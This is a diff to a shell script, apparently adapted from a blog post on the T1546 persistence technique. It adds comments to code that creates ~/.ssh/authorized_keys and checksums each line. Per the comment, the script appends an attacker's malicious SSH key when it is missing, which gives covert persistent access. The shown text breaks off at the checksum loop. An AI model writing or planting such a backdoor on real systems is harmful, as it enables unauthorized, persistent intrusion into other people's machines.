@@ -2,6 +2,7 @@
 exists="False"
 
 #Original code sourced from https://thepcn3rd.blogspot.com/2021/11/t1546-unix-shell-configuration.html
+#The purpose of the following code is to check if the ~/.ssh directory exists and if it doesn't to create it.
 #Make sure you referance directories without a following /
 if [ -d "~/.ssh" ]
 then
@@ -14,6 +15,8 @@ then
         touch ~/.ssh/authorized_keys
         chmod 600 ~/.ssh/authorized_keys
 fi
+
+# The rest of the code runs a checksum of every line ith the authorized_keys file.  If none of those checksums matches the checksum for the ssh key of the attacking server then the code adds the malicious ssh key to the authorized_keys file
 while read l; do
 
   checksum=`echo "$l" | sha256sum | awk '{print $1}'`
